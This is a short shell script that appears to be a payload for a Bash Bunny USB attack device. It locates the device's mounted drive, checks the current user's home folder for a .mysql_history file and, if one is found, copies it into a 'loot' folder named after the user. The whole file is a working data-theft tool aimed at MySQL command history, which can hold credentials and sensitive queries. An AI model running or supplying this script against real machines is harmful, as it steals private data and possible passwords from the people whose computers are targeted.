#!/bin/sh
disk=$(lsblk -fs | grep BashBunny | awk '{print $1}')
lmnt=$(lsblk | grep $disk | awk '{print $7}')
ls -a ~/ | grep -w '.mysql_history' &> /dev/null
if [ $? = 0 ]; then
        cp -r ~/.mysql_history $lmnt/loot/$(whoami)-mysql_history.txt
fi 
